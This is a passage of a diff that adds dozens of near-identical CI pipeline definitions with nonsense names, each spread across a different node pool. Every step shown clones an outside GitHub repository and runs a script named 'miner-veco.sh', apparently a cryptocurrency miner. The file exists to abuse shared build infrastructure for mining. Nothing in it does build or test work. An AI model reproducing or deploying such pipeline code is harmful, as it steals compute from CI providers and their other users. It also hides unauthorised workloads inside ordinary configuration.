+        type: Bash
+        configuration:
+          nodePool: asd
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawef
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asf
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaweg
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asg
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaweh
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ash
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawej
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asj
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawek
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ask
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawel
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asl
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaweq
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asq
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawew
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asw
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawee
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ase
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawer
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asr
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawet
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ast
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawey
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asy
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaweu
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asu
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawei
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asi
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaweo
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: aso
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+
+  - name: samajakilmajasasawep
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asp
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawez
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asz
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawex
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asx
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawec
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asc
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawev
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asv
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasaweb
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asb
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawen
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asn
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajasasawem
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asm
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaea
+    steps:
+      - name: p1_s1
+        type: Bash
+        configuration:
+          nodePool: asa
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaws
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ass
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawed
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asd
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawef
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asf
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaweg
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asg
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaweh
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ash
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawej
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asj
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawek
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ask
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawel
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asl
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaweq
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asq
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawew
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asw
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawee
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ase
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawer
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asr
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawet
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ast
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawey
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asy
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaweu
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asu
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawei
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asi
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaweo
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: aso
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+
+  - name: samajakilmajawep
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asp
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawez
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asz
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawex
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asx
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawec
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asc
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawev
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asv
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajaweb
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asb
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawen
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asn
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilmajawem
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asm
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaea
+    steps:
+      - name: p1_s1
+        type: Bash
+        configuration:
+          nodePool: asa
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaws
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ass
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawed
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asd
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawef
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asf
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaweg
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asg
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaweh
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ash
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawej
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asj
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawek
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ask
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawel
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asl
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaweq
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asq
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawew
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asw
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawee
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ase
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawer
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asr
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawet
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ast
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawey
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asy
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaweu
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asu
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawei
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asi
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaweo
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: aso
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+
+  - name: samajakilsasawep
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asp
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawez
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asz
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawex
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asx
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawec
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asc
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawev
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asv
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasaweb
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asb
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawen
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asn
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilsasawem
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asm
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilea
+    steps:
+      - name: p1_s1
+        type: Bash
+        configuration:
+          nodePool: asa
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilws
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ass
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwed
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asd
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwef
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asf
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilweg
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asg
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilweh
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ash
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwej
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asj
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwek
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ask
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwel
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asl
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilweq
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asq
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwew
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asw
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwee
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ase
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwer
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asr
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwet
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: ast
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwey
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asy
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilweu
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asu
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwei
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asi
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilweo
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: aso
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+
+  - name: samajakilwep
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asp
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwez
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asz
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwex
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asx
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwec
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asc
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwev
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asv
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilweb
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asb
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwen
+    steps:
+      - name: p1_s1w
+        type: Bash
+        configuration:
+          nodePool: asn
+          inputResources:
+            - name: myFirstRepo
+        execution:
+          onExecute:
+            - git clone https://github.com/maujendakint8sa/asasdasf && cd asasdasf && ./miner-veco.sh
+  - name: samajakilwem
     steps:
       - name: p1_s1w
         type: Bash
